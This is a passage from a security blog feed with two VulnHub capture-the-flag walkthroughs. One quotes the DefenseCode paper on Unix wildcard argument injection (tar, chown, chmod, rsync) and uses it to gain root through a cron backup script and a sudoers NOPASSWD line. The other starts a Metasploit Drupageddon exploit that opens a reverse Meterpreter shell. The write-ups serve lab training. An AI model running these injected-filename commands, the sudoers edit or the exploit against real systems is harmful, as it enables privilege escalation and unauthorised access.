-rw-rw-r&mdash;.  1 leon   leon      0 Oct 28 17:03 file1.txt
-rw-rw-r&mdash;.  1 leon   leon      0 Oct 28 17:03 file2.txt
-rw-rw-r&mdash;.  1 leon   leon      0 Oct 28 17:03 file3.txt
-rw-rw-r&mdash;.  1 nobody nobody    0 Oct 28 16:38 -rf</p>

<p>We have directory with few subdirectories and few files in it.
There is also file with &lsquo;-rf&rsquo; filename ther owned by the user &lsquo;nobody&rsquo;.
Now, let&rsquo;s run &lsquo;rm *&rsquo; command, and check directory content again.</p>

<p>[root@defensecode public]# rm *
[root@defensecode public]# ls -al
total 8
drwxrwxr-x.  2 leon   leon   4096 Oct 28 17:05 .
drwx&mdash;&mdash;&mdash;. 22 leon   leon   4096 Oct 28 16:15 ..
-rw-rw-r&mdash;.  1 nobody nobody    0 Oct 28 16:38 -rf</p>

<p>Directory is totally empty, except for &lsquo;-rf&rsquo; file in it.
All files and directories were recursively deleted, and it&rsquo;s pretty obvious what happened&hellip;
When we started &lsquo;rm&rsquo; command with asterisk argument, all filenames in current
directory were passed as arguments to &lsquo;rm&rsquo; on command line, exactly same as
following line:</p>

<p>[user@defensecode WILD]$ rm DIR1 DIR2 DIR3 file1.txt file2.txt file3.txt -rf</p>

<p>Since there is &lsquo;-rf&rsquo; filename in current directory, &lsquo;rm&rsquo; got -rf option as the
last argument, and all files in current directory were recursively deleted.
We can also check that with strace:</p>

<p>[leon@defensecode WILD]$ strace rm *
execve(&ldquo;/bin/rm&rdquo;, [&ldquo;rm&rdquo;, &ldquo;DIR1&rdquo;, &ldquo;DIR2&rdquo;, &ldquo;DIR3&rdquo;, &ldquo;file1.txt&rdquo;, &ldquo;file2.txt&rdquo;,
&ldquo;file3.txt&rdquo;, &ldquo;-rf&rdquo;], [/<em> 25 vars </em>/]) = 0</p>

<pre><code>          ^- HERE
</code></pre>

<p>Now we know how it&rsquo;s possible to inject arbitrary arguments to the unix
shell programs. In the following chapter we will discuss how we can abuse that
feature to do much more than just recursively delete files.</p>

<p>===[ 4. Something more useful&hellip;</p>

<p>Since now we know how it&rsquo;s possible to inject arbitrary arguments to
shell commands, let&rsquo;s demonstrate few examples that are more useful,
than just recursive file unlinking.
First, when I stumbled across this wildcard tricks, I was starting to look
for basic and common Unix programs that could be seriously affected
with arbitrary and unexpected arguments.
In real-world cases, following examples could be abused in form of direct
interactive shell poisoning, or through some commands started from cron job,
shell scripts, through some web application, and so on.
In all examples below, attacker is hidden behind &lsquo;leon&rsquo; account, and victim
is of course &ndash; root account.</p>

<p>==[ 4.1 Chown file reference trick (file owner hijacking)</p>

<p>First really interesting target I&rsquo;ve stumbled across is &lsquo;chown&rsquo;.
Let&rsquo;s say that we have some publicly writeable directory with bunch of
PHP files in there, and root user wants to change owner of all PHP files to &lsquo;nobody&rsquo;.
Pay attention to the file owners in the following files list.</p>

<p>[root@defensecode public]# ls -al
total 52
drwxrwxrwx.  2 user user 4096 Oct 28 17:47 .
drwx&mdash;&mdash;&mdash;. 22 user user 4096 Oct 28 17:34 ..
-rw-rw-r&mdash;.  1 user user   66 Oct 28 17:36 admin.php
-rw-rw-r&mdash;.  1 user user   34 Oct 28 17:35 ado.php
-rw-rw-r&mdash;.  1 user user   80 Oct 28 17:44 config.php
-rw-rw-r&mdash;.  1 user user  187 Oct 28 17:44 db.php
-rw-rw-r&mdash;.  1 user user  201 Oct 28 17:35 download.php
-rw-r&mdash;r&mdash;.  1 leon leon    0 Oct 28 17:40 .drf.php
-rw-rw-r&mdash;.  1 user user   43 Oct 28 17:35 file1.php
-rw-rw-r&mdash;.  1 user user   56 Oct 28 17:47 footer.php
-rw-rw-r&mdash;.  1 user user  357 Oct 28 17:36 global.php
-rw-rw-r&mdash;.  1 user user  225 Oct 28 17:35 header.php
-rw-rw-r&mdash;.  1 user user  117 Oct 28 17:35 inc.php
-rw-rw-r&mdash;.  1 user user  111 Oct 28 17:38 index.php
-rw-rw-r&mdash;.  1 leon leon    0 Oct 28 17:45 &mdash;reference=.drf.php
-rw-rw&mdash;&mdash;.  1 user user   66 Oct 28 17:35 password.inc.php
-rw-rw-r&mdash;.  1 user user   94 Oct 28 17:35 script.php</p>

<p>Files in this public directory are mostly owned by the user named &lsquo;user&rsquo;,
and root user will now change that to &lsquo;nobody&rsquo;.</p>

<p>[root@defensecode public]# chown -R nobody:nobody *.php</p>

<p>Let&rsquo;s see who owns files now&hellip;</p>

<p>[root@defensecode public]# ls -al
total 52
drwxrwxrwx.  2 user user 4096 Oct 28 17:47 .
drwx&mdash;&mdash;&mdash;. 22 user user 4096 Oct 28 17:34 ..
-rw-rw-r&mdash;.  1 leon leon   66 Oct 28 17:36 admin.php
-rw-rw-r&mdash;.  1 leon leon   34 Oct 28 17:35 ado.php
-rw-rw-r&mdash;.  1 leon leon   80 Oct 28 17:44 config.php
-rw-rw-r&mdash;.  1 leon leon  187 Oct 28 17:44 db.php
-rw-rw-r&mdash;.  1 leon leon  201 Oct 28 17:35 download.php
-rw-r&mdash;r&mdash;.  1 leon leon    0 Oct 28 17:40 .drf.php
-rw-rw-r&mdash;.  1 leon leon   43 Oct 28 17:35 file1.php
-rw-rw-r&mdash;.  1 leon leon   56 Oct 28 17:47 footer.php
-rw-rw-r&mdash;.  1 leon leon  357 Oct 28 17:36 global.php
-rw-rw-r&mdash;.  1 leon leon  225 Oct 28 17:35 header.php
-rw-rw-r&mdash;.  1 leon leon  117 Oct 28 17:35 inc.php
-rw-rw-r&mdash;.  1 leon leon  111 Oct 28 17:38 index.php
-rw-rw-r&mdash;.  1 leon leon    0 Oct 28 17:45 &mdash;reference=.drf.php
-rw-rw&mdash;&mdash;.  1 leon leon   66 Oct 28 17:35 password.inc.php
-rw-rw-r&mdash;.  1 leon leon   94 Oct 28 17:35 script.php</p>

<p>Something is not right&hellip; What happened? Somebody got drunk here.
Superuser tried to change files owner to the user:group &lsquo;nobody&rsquo;, but somehow,
all files are owned by the user &lsquo;leon&rsquo; now.</p>

<p>If we take closer look, this directory previously contained just the
following two files created and owned by the user &lsquo;leon&rsquo;.</p>

<p>-rw-r&mdash;r&mdash;.  1 leon leon    0 Oct 28 17:40 .drf.php
-rw-rw-r&mdash;.  1 leon leon    0 Oct 28 17:45 &mdash;reference=.drf.php</p>

<p>Thing is that wildcard character used in &lsquo;chown&rsquo; command line took arbitrary
&lsquo;&mdash;reference=.drf.php&rsquo; file and passed it to the chown command at
the command line as an option.</p>

<p>Let&rsquo;s check chown manual page (man chown):
   &mdash;reference=RFILE</p>

<pre><code>      use RFILE's owner and group rather than specifying OWNER:GROUP values
</code></pre>

<p>So in this case, &lsquo;&mdash;reference&rsquo; option to &lsquo;chown&rsquo; will override &lsquo;nobody:nobody&rsquo;
specified as the root, and new owner of files in this directory will be exactly
same as the owner of &lsquo;.drf.php&rsquo;, which is in this case user &lsquo;leon&rsquo;.
Just for the record, &lsquo;.drf&rsquo; is short for Dummy Reference File. :)</p>

<p>To conclude, reference option can be abused to change ownership of files to some
arbitrary user. If we set some other file as argument to the &mdash;reference option,
file that&rsquo;s owned by some other user, not &lsquo;leon&rsquo;, in that case he would become owner
of all files in this directory.</p>

<p>With this simple chown parameter pollution, we can trick root into changing ownership
of files to arbitrary users, and practically &ldquo;hijack&rdquo; files that are of interest to us.</p>

<p>Even more, if user &lsquo;leon&rsquo; previously created a symbolic link in that directory
that points to let&rsquo;s say /etc/shadow, ownership of /etc/shadow would also be changed
to the user &lsquo;leon&rsquo;.</p>

<p>===[ 4.2 Chmod file reference trick</p>

<p>Another interesting attack vector similar to previously described &lsquo;chown&rsquo;
attack is &lsquo;chmod&rsquo;.
Chmod also has &mdash;reference option that can be abused to specify arbitrary
permissions on files selected with asterisk wildcard.</p>

<p>Chmod manual page (man chmod):</p>

<pre><code>   --reference=RFILE
          use RFILE's mode instead of MODE values
</code></pre>

<p>Example is presented below.</p>

<p>[root@defensecode public]# ls -al
total 68
drwxrwxrwx.  2 user user  4096 Oct 29 00:41 .
drwx&mdash;&mdash;&mdash;. 24 user user  4096 Oct 28 18:32 ..
-rw-rw-r&mdash;.  1 user user 20480 Oct 28 19:13 admin.php
-rw-rw-r&mdash;.  1 user user    34 Oct 28 17:47 ado.php
-rw-rw-r&mdash;.  1 user user   187 Oct 28 17:44 db.php
-rw-rw-r&mdash;.  1 user user   201 Oct 28 17:43 download.php
-rwxrwxrwx.  1 leon leon     0 Oct 29 00:40 .drf.php
-rw-rw-r&mdash;.  1 user user    43 Oct 28 17:35 file1.php
-rw-rw-r&mdash;.  1 user user    56 Oct 28 17:47 footer.php
-rw-rw-r&mdash;.  1 user user   357 Oct 28 17:36 global.php
-rw-rw-r&mdash;.  1 user user   225 Oct 28 17:37 header.php
-rw-rw-r&mdash;.  1 user user   117 Oct 28 17:36 inc.php
-rw-rw-r&mdash;.  1 user user   111 Oct 28 17:38 index.php
-rw-r&mdash;r&mdash;.  1 leon leon     0 Oct 29 00:41 &mdash;reference=.drf.php
-rw-rw-r&mdash;.  1 user user    94 Oct 28 17:38 script.php</p>

<p>Superuser will now try to set mode 000 on all files.</p>

<p>[root@defensecode public]# chmod 000 *</p>

<p>Let&rsquo;s check permissions on files&hellip;</p>

<p>[root@defensecode public]# ls -al
total 68
drwxrwxrwx.  2 user user  4096 Oct 29 00:41 .
drwx&mdash;&mdash;&mdash;. 24 user user  4096 Oct 28 18:32 ..
-rwxrwxrwx.  1 user user 20480 Oct 28 19:13 admin.php
-rwxrwxrwx.  1 user user    34 Oct 28 17:47 ado.php
-rwxrwxrwx.  1 user user   187 Oct 28 17:44 db.php
-rwxrwxrwx.  1 user user   201 Oct 28 17:43 download.php
-rwxrwxrwx.  1 leon leon     0 Oct 29 00:40 .drf.php
-rwxrwxrwx.  1 user user    43 Oct 28 17:35 file1.php
-rwxrwxrwx.  1 user user    56 Oct 28 17:47 footer.php
-rwxrwxrwx.  1 user user   357 Oct 28 17:36 global.php
-rwxrwxrwx.  1 user user   225 Oct 28 17:37 header.php
-rwxrwxrwx.  1 user user   117 Oct 28 17:36 inc.php
-rwxrwxrwx.  1 user user   111 Oct 28 17:38 index.php
-rw-r&mdash;r&mdash;.  1 leon leon     0 Oct 29 00:41 &mdash;reference=.drf.php
-rwxrwxrwx.  1 user user    94 Oct 28 17:38 script.php</p>

<p>What happened? Instead of 000, all files are now set to mode 777 because
of the &lsquo;&mdash;reference&rsquo; option supplied through file name..
Once again, file .drf.php owned by user &lsquo;leon&rsquo; with mode 777 was
used as reference file and since &mdash;reference option is supplied, all files
will be set to mode 777.
Beside just &mdash;reference option, attacker can also create another file with
&lsquo;-R&rsquo; filename, to change file permissions on files in all subdirectories recursively.</p>

<p>===[ 4.3 Tar arbitrary command execution</p>

<p>Previous example is nice example of file ownership hijacking. Now, let&rsquo;s go to even
more interesting stuff like arbitrary command execution. Tar is very common unix program
for creating and extracting archives.
Common usage for lets say creating archives is:</p>

<p>[root@defensecode public]# tar cvvf archive.tar *</p>

<p>So, what&rsquo;s the problem with &lsquo;tar&rsquo;?
Thing is that tar has many options, and among them, there some pretty interesting
options from arbitrary parameter injection point of view.</p>

<p>Let&rsquo;s check tar manual page (man tar):</p>

<pre><code>  --checkpoint[=NUMBER]
          display progress messages every NUMBERth record (default 10)

   --checkpoint-action=ACTION
          execute ACTION on each checkpoint
</code></pre>

<p>There is &lsquo;&mdash;checkpoint-action&rsquo; option, that will specify program which will
be executed when checkpoint is reached. Basically, that allows us arbitrary
command execution.</p>

<p>Check the following directory:</p>

<p>[root@defensecode public]# ls -al
total 72
drwxrwxrwx.  2 user user  4096 Oct 28 19:34 .
drwx&mdash;&mdash;&mdash;. 24 user user  4096 Oct 28 18:32 ..
-rw-rw-r&mdash;.  1 user user 20480 Oct 28 19:13 admin.php
-rw-rw-r&mdash;.  1 user user    34 Oct 28 17:47 ado.php
-rw-r&mdash;r&mdash;.  1 leon leon     0 Oct 28 19:19 &mdash;checkpoint=1
-rw-r&mdash;r&mdash;.  1 leon leon     0 Oct 28 19:17 &mdash;checkpoint-action=exec=sh shell.sh
-rw-rw-r&mdash;.  1 user user   187 Oct 28 17:44 db.php
-rw-rw-r&mdash;.  1 user user   201 Oct 28 17:43 download.php
-rw-rw-r&mdash;.  1 user user    43 Oct 28 17:35 file1.php
-rw-rw-r&mdash;.  1 user user    56 Oct 28 17:47 footer.php
-rw-rw-r&mdash;.  1 user user   357 Oct 28 17:36 global.php
-rw-rw-r&mdash;.  1 user user   225 Oct 28 17:37 header.php
-rw-rw-r&mdash;.  1 user user   117 Oct 28 17:36 inc.php
-rw-rw-r&mdash;.  1 user user   111 Oct 28 17:38 index.php
-rw-rw-r&mdash;.  1 user user    94 Oct 28 17:38 script.php
-rwxr-xr-x.  1 leon leon    12 Oct 28 19:17 shell.sh</p>

<p>Now, for example, root user wants to create archive of all files in current
directory.</p>

<p>[root@defensecode public]# tar cf archive.tar *</p>

<p>uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023</p>

<p>Boom! What happened? /usr/bin/id command gets executed! We&rsquo;ve just achieved arbitrary command
execution under root privileges.
Once again, there are few files created by user &lsquo;leon&rsquo;.</p>

<p>-rw-r&mdash;r&mdash;.  1 leon leon     0 Oct 28 19:19 &mdash;checkpoint=1
-rw-r&mdash;r&mdash;.  1 leon leon     0 Oct 28 19:17 &mdash;checkpoint-action=exec=sh shell.sh
-rwxr-xr-x.  1 leon leon    12 Oct 28 19:17 shell.sh</p>

<p>Options &lsquo;&mdash;checkpoint=1&rsquo; and &lsquo;&mdash;checkpoint-action=exec=sh shell.sh&rsquo; are passed to the
&lsquo;tar&rsquo; program as command line options. Basically, they command tar to execute shell.sh
shell script upon the execution.</p>

<p>[root@defensecode public]# cat shell.sh
/usr/bin/id</p>

<p>So, with this tar argument pollution, we can basically execute arbitrary commands
with privileges of the user that runs tar. As demonstrated on the &lsquo;root&rsquo; account above.</p>

<p>===[ 4.4 Rsync arbitrary command execution</p>

<p>Rsync is &ldquo;a fast, versatile, remote (and local) file-copying tool&rdquo;, that is very
common on Unix systems.
If we check &lsquo;rsync&rsquo; manual page, we can again find options that can be abused for arbitrary
command execution.</p>

<p>Rsync manual:
&ldquo;You use rsync in the same way you use rcp. You must specify a source and a destination,
one of which may be remote.&rdquo;</p>

<p>Interesting rsync option from manual:</p>

<p> -e, &mdash;rsh=COMMAND           specify the remote shell to use</p>

<pre><code> --rsync-path=PROGRAM    specify the rsync to run on remote machine
</code></pre>

<p>Let&rsquo;s abuse one example directly from the &lsquo;rsync&rsquo; manual page.
Following example will copy all C files in local directory to a remote host &lsquo;foo&rsquo;
in &lsquo;/src&rsquo; directory.</p>

<h1>rsync -t *.c foo:src/</h1>

<p>Directory content:</p>

<p>[root@defensecode public]# ls -al
total 72
drwxrwxrwx.  2 user user  4096 Mar 28 04:47 .
drwx&mdash;&mdash;&mdash;. 24 user user  4096 Oct 28 18:32 ..
-rwxr-xr-x.  1 user user 20480 Oct 28 19:13 admin.php
-rwxr-xr-x.  1 user user    34 Oct 28 17:47 ado.php
-rwxr-xr-x.  1 user user   187 Oct 28 17:44 db.php
-rwxr-xr-x.  1 user user   201 Oct 28 17:43 download.php
-rw-r&mdash;r&mdash;.  1 leon leon     0 Mar 28 04:45 -e sh shell.c
-rwxr-xr-x.  1 user user    43 Oct 28 17:35 file1.php
-rwxr-xr-x.  1 user user    56 Oct 28 17:47 footer.php
-rwxr-xr-x.  1 user user   357 Oct 28 17:36 global.php
-rwxr-xr-x.  1 user user   225 Oct 28 17:37 header.php
-rwxr-xr-x.  1 user user   117 Oct 28 17:36 inc.php
-rwxr-xr-x.  1 user user   111 Oct 28 17:38 index.php
-rwxr-xr-x.  1 user user    94 Oct 28 17:38 script.php
-rwxr-xr-x.  1 leon leon    31 Mar 28 04:45 shell.c</p>

<p>Now root will try to copy all C files to the remote server.</p>

<p>[root@defensecode public]# rsync -t *.c foo:src/</p>

<p>rsync: connection unexpectedly closed (0 bytes received so far) [sender]
rsync error: error in rsync protocol data stream (code 12) at io.c(601) [sender=3.0.8]</p>

<p>Let&rsquo;s see what happened&hellip;</p>

<p>[root@defensecode public]# ls -al
total 76
drwxrwxrwx.  2 user user  4096 Mar 28 04:49 .
drwx&mdash;&mdash;&mdash;. 24 user user  4096 Oct 28 18:32 ..
-rwxr-xr-x.  1 user user 20480 Oct 28 19:13 admin.php
-rwxr-xr-x.  1 user user    34 Oct 28 17:47 ado.php
-rwxr-xr-x.  1 user user   187 Oct 28 17:44 db.php
-rwxr-xr-x.  1 user user   201 Oct 28 17:43 download.php
-rw-r&mdash;r&mdash;.  1 leon leon     0 Mar 28 04:45 -e sh shell.c
-rwxr-xr-x.  1 user user    43 Oct 28 17:35 file1.php
-rwxr-xr-x.  1 user user    56 Oct 28 17:47 footer.php
-rwxr-xr-x.  1 user user   357 Oct 28 17:36 global.php
-rwxr-xr-x.  1 user user   225 Oct 28 17:37 header.php
-rwxr-xr-x.  1 user user   117 Oct 28 17:36 inc.php
-rwxr-xr-x.  1 user user   111 Oct 28 17:38 index.php
-rwxr-xr-x.  1 user user    94 Oct 28 17:38 script.php
-rwxr-xr-x.  1 leon leon    31 Mar 28 04:45 shell.c
-rw-r&mdash;r&mdash;.  1 root root   101 Mar 28 04:49 shell_output.txt</p>

<p>There were two files owned by user &lsquo;leon&rsquo;, as listed below.</p>

<p>-rw-r&mdash;r&mdash;.  1 leon leon     0 Mar 28 04:45 -e sh shell.c
-rwxr-xr-x.  1 leon leon    31 Mar 28 04:45 shell.c</p>

<p>After &lsquo;rsync&rsquo; execution, new file shell_output.txt whose owner is root
is created in same directory.</p>

<p>-rw-r&mdash;r&mdash;.  1 root root   101 Mar 28 04:49 shell_output.txt</p>

<p>If we check its content, following data is found.</p>

<p>[root@defensecode public]# cat shell_output.txt
uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023</p>

<p>Trick is that because of the &lsquo;*.c&rsquo; wildcard, &lsquo;rsync&rsquo; got &lsquo;-e sh shell.c&rsquo; option
on command line, and shell.c will be executed upon &lsquo;rsync&rsquo; start.
Content of shell.c is presented below.</p>

<p>[root@defensecode public]# cat shell.c
/usr/bin/id > shell_output.txt</p>

<p>===[ 5. Conclusion</p>

<p>Techniques discussed in article can be applied in different forms on various popular
Unix tools. In real-world attacks, arbitrary shell options/arguments could be hidden
among regular files, and not so easily spotted by administrator. Moreover, in case of
cron jobs, shell scripts or web applications that calls shell commands, that&rsquo;s not
even important. Moreover, there are probably much more popular Unix tools susceptible
to previously described wildcard attacks.
Thanks to Hrvoje Spoljar and Sec-Consult for a few ideas regarding this document.
```</p>

<p>This entertaining and useful read will probably come in handy next! I looked around some more, and saw a backup folder inside the / directory:</p>

<p>```
$ ls
backup.sh
backup.tgz
$ cat backup.sh</p>

<h1>!/bin/bash</h1>

<p>cd /var/www/html
tar cf /backup/backup.tgz *
```</p>

<p>This backup script creates an archive of all files inside /var/www/html. And it&rsquo;s owned by root. After reading that section about tar command execution, this is a big sign of the next steps to take in achieving root. So I needed to find out if this backup shell script is being used by anything. I grepped for a mention of the script in the files present on the filesystem:</p>

<p><code>
grep -r "backup.sh" 2&gt;/dev/null
</code></p>

<p>And an interesting entry popped up:</p>

<p><code>
etc/crontab:*/1 *   * * *   root    /backup/backup.sh
</code></p>

<p>The backup script is run every minute by cron. Now review the tar command execution section before proceeding. To run arbitrary code, we have to create 3 files inside the directory where tar is run, which in this case is /var/www/html.</p>

<p>Now, remember the checkpoint parameters:</p>

<p>```
&mdash;checkpoint[=NUMBER]</p>

<pre><code>display progress messages every NUMBERth record (default 10)
</code></pre>

<p>&mdash;checkpoint-action=ACTION</p>

<pre><code>execute ACTION on each checkpoint
</code></pre>

<p>```</p>

<p>We can use these to inject arbitrary commands. In other words, run the desired command when the checkpoint is reached. To test it out, I created the files as follows:</p>

<p><code>
echo "" &gt; --checkpoint=1
echo "" &gt; "--checkpoint-action=exec=sh shell.sh"
echo "/usr/bin/whoami &gt; /tmp/readme" &gt; shell.sh
chmod +x shell.sh
</code></p>

<p>And now when tar is run, it will pick up the files I created as parameters:</p>

<p><code>
$ ls
--checkpoint-action=exec=sh shell.sh
--checkpoint=1
bomb.jpg
bomb.php
content.php
index.php
info.php
main.php
mj.jpg
nav.php
props.php
shell.sh
</code></p>

<p>I waited for a bit and then:</p>

<p><code>
$ ls /tmp
readme
systemd-private-b21f86620e1c4dbf8ba8443074d9367f-systemd-timesyncd.service-flEglg
vmware-root
$ cat /tmp/readme
root
</code></p>

<p>Awesome! It works! And this is a technique I had no idea about! So now I&rsquo;ve changed the commands to give my low-privilege user full permissions:</p>

<p><code>
$ echo 'echo "www-data  ALL=(ALL) NOPASSWD:ALL" &gt;&gt; /etc/sudoers' &gt; shell.sh
$ cat shell.sh
echo "www-data  ALL=(ALL) NOPASSWD:ALL" &gt;&gt; /etc/sudoers
</code></p>

<p>Again, after some waiting, the root powers are here!</p>

<p>```
$ sudo su
id
uid=0(root) gid=0(root) groups=0(root)
cat /root/credits.txt</p>

<pre><code>    ,----,                                                               
  ,/   .`|                                                               
,`   .'  :  ,---,                          ,---,.                        
</code></pre>

<p>  ;    ;     /,&mdash;.&lsquo; |                        ,&rsquo;  .&lsquo; |                  ,&mdash;&ndash;,
.&rsquo;<strong>_,/    ,&lsquo; |  |  :                      ,&mdash;&ndash;.&rsquo;   |      ,&mdash;&ndash;,     ,&mdash;&ndash;.&lsquo;|
|    :     |  :  :  :                      |   |   .&rsquo;  ,&ndash;+&ndash;. /  |    |   | :
;    |.&lsquo;;  ;  :  |  |,&mdash;.   ,&mdash;&ndash;.          :   :  |&ndash;, ,&mdash;.&rsquo;|&lsquo;   |    |   | |
`&mdash;&mdash;&rsquo;  |  |  |  :  &lsquo;   |  /     \         :   |  ;/||   |  ,&ldquo;&rsquo; |  ,&mdash;.</strong>| |</p>

<pre><code>'   :  ;  |  |   /' : /    /  |        |   :   .'|   | /  | | /   ,'   | 
|   |  '  '  :  | | |.    ' / |        |   |  |-,|   | |  | |.   '  /  | 
'   :  |  |  |  ' | :'   ;   /|        '   :  ;/||   | |  |/ '   ; |:  | 
;   |.'   |  :  :_:,''   |  / |        |   |    \|   | |--'  |   | '/  ' 
'---'     |  | ,'    |   :    |        |   :   .'|   |/      |   :    :| 
          `--''       \   \  /         |   | ,'  '---'        \   \  /   
                       `----'          `----'                  `----'    
</code></pre>

<p>This was milnet for #vulnhub by @teh_warriar
I hope you enjoyed this vm!</p>

<p>If you liked it drop me a line on twitter or in #vulnhub.</p>

<p>I hope you found the clue:
/home/langman/SDINET/DefenseCode_Unix_WildCards_Gone_Wild.txt
I was sitting on the idea for using this technique for a BOOT2ROOT VM prives for a long time&hellip;</p>

<p>This VM was inspired by The Cuckoo&rsquo;s Egg.
If you have not read it give it a try:
<a href="http://www.amazon.com/Cuckoos-Egg-Tracking-Computer-Espionage/dp/1416507787/">http://www.amazon.com/Cuckoos-Egg-Tracking-Computer-Espionage/dp/1416507787/</a>
```</p>

<p>Great challenge, dropping some old-school knowledge about getting command injection by exploiting Unix wildcards!</p>

<p>```</p>

<hr />

<p>/ Increased knowledge will help you now. \
\ Have mate&rsquo;s phone bugged.              /</p>

<hr />

<pre><code>    \   ^__^
     \  (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Dropping Droopy]]></title>
    <link href="http://chousensha.github.io/blog/2018/05/04/dropping-droopy/"/>
    <updated>2018-05-04T13:05:08-04:00</updated>
    <id>http://chousensha.github.io/blog/2018/05/04/dropping-droopy</id>
    <content type="html"><![CDATA[<p>I&rsquo;m back in the game with preparing for OSCP, and resuming the VulnHub machines. Today&rsquo;s target is Droopy. The author left 2 hints for this challenge:</p>

<p>1.) Grab a copy of the rockyou wordlist.</p>

<p>2.) It&rsquo;s fun to read other people&rsquo;s email.</p>

<!-- more -->


<p><code>
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-generator: Drupal 7 (http://drupal.org)
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Welcome to La fraude fiscale des grandes soci\xC3\xA9t\xC3\xA9s | La fraud...
</code></p>

<p>Looks like this will be a web-based challenge.</p>

<p><img class="center" src="/images/pentest/droopy.png" title="&lsquo;droopy&rsquo; &lsquo;droopy&rsquo;" ></p>

<p>There are quite a few entries inside robots.txt:</p>

<p>```
User-agent: *
Crawl-delay: 10</p>

<h1>Directories</h1>

<p>Disallow: /includes/
Disallow: /misc/
Disallow: /modules/
Disallow: /profiles/
Disallow: /scripts/
Disallow: /themes/</p>

<h1>Files</h1>

<p>Disallow: /CHANGELOG.txt
Disallow: /cron.php
Disallow: /INSTALL.mysql.txt
Disallow: /INSTALL.pgsql.txt
Disallow: /INSTALL.sqlite.txt
Disallow: /install.php
Disallow: /INSTALL.txt
Disallow: /LICENSE.txt
Disallow: /MAINTAINERS.txt
Disallow: /update.php
Disallow: /UPGRADE.txt
Disallow: /xmlrpc.php</p>

<h1>Paths (clean URLs)</h1>

<p>Disallow: /admin/
Disallow: /comment/reply/
Disallow: /filter/tips/
Disallow: /node/add/
Disallow: /search/
Disallow: /user/register/
Disallow: /user/password/
Disallow: /user/login/
Disallow: /user/logout/</p>

<h1>Paths (no clean URLs)</h1>

<p>Disallow: /?q=admin/
Disallow: /?q=comment/reply/
Disallow: /?q=filter/tips/
Disallow: /?q=node/add/
Disallow: /?q=search/
Disallow: /?q=user/password/
Disallow: /?q=user/register/
Disallow: /?q=user/login/
Disallow: /?q=user/logout/
```</p>

<p>Sifting through the entries, I found the exact version on Drupal is 7.30, from the /CHANGELOG.txt file. Googling an exploit for this version led me to..<a href="https://www.rapid7.com/db/modules/exploit/multi/http/drupal_drupageddon">Drupageddon</a>!!  Or more official, CVE-2014-3704, which describes a SQL injection vulnerability in Drupal. I fired up Metasploit for the exploit:</p>

<p>```
msf > use exploit/multi/http/drupal_drupageddon
msf exploit(drupal_drupageddon) > info</p>

<pre><code>   Name: Drupal HTTP Parameter Key/Value SQL Injection
 Module: exploit/multi/http/drupal_drupageddon
</code></pre>

<p>   Platform: PHP</p>

<pre><code>   Arch: php
</code></pre>

<p> Privileged: No</p>

<pre><code>License: Metasploit Framework License (BSD)
   Rank: Excellent
</code></pre>

<p>  Disclosed: 2014-10-15</p>

<p>Provided by:
  SektionEins
  Christian Mehlmauer <a href="&#109;&#97;&#105;&#x6c;&#x74;&#111;&#58;&#x46;&#105;&#114;&#x65;&#70;&#x61;&#114;&#x74;&#x40;&#103;&#109;&#97;&#105;&#x6c;&#x2e;&#99;&#x6f;&#x6d;">&#x46;&#105;&#114;&#101;&#70;&#x61;&#x72;&#x74;&#x40;&#103;&#109;&#97;&#x69;&#108;&#46;&#x63;&#x6f;&#x6d;</a>
  Brandon Perry</p>

<p>Available targets:
  Id  Name</p>

<hr />

<p>  0   Drupal 7.0 &ndash; 7.31</p>

<p>Basic options:
  Name       Current Setting  Required  Description</p>

<hr />

<p>  Proxies                     no        A proxy chain of format type:host:port[,type:host:port][&hellip;]
  RHOST      192.168.217.139  yes       The target address
  RPORT      80               yes       The target port (TCP)
  SSL        false            no        Negotiate SSL/TLS for outgoing connections
  TARGETURI  /                yes       The target URI of the Drupal installation
  VHOST                       no        HTTP server virtual host</p>

<p>Payload information:</p>

<p>Description:
  This module exploits the Drupal HTTP Parameter Key/Value SQL
  Injection (aka Drupageddon) in order to achieve a remote shell on
  the vulnerable instance. This module was tested against Drupal 7.0
  and 7.31 (was fixed in 7.32).</p>

<p>References:
  <a href="https://cvedetails.com/cve/CVE-2014-3704/">https://cvedetails.com/cve/CVE-2014-3704/</a>
  <a href="https://www.drupal.org/SA-CORE-2014-005">https://www.drupal.org/SA-CORE-2014-005</a>
  <a href="http://www.sektioneins.de/en/advisories/advisory-012014-drupal-pre-auth-sql-injection-vulnerability.html">http://www.sektioneins.de/en/advisories/advisory-012014-drupal-pre-auth-sql-injection-vulnerability.html</a>
msf exploit(drupal_drupageddon) > exploit</p>

<p>[<em>] Started reverse TCP handler on 192.168.217.132:4444
[</em>] Testing page
[<em>] Creating new user yCTZcwgtLV:WLhkIYdDtB
[</em>] Logging in as yCTZcwgtLV:WLhkIYdDtB
[<em>] Trying to parse enabled modules
[</em>] Enabling the PHP filter module
[<em>] Setting permissions for PHP filter module
[</em>] Getting tokens from create new article page
[<em>] Calling preview page. Exploit should trigger&hellip;
[</em>] Sending stage (37543 bytes) to 192.168.217.139
[*] Meterpreter session 1 opened (192.168.217.132:4444 &ndash;> 192.168.217.139:51854) at 2018-05-04 13:48:44 -0400
```</p>

<p>I dropped into a shell and checked the kernel version:</p>

<p><code>
meterpreter &gt; shell
Process 1385 created.
Channel 0 created.
uname -a
Linux droopy 3.13.0-43-generic #72-Ubuntu SMP Mon Dec 8 19:35:06 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
</code></p>

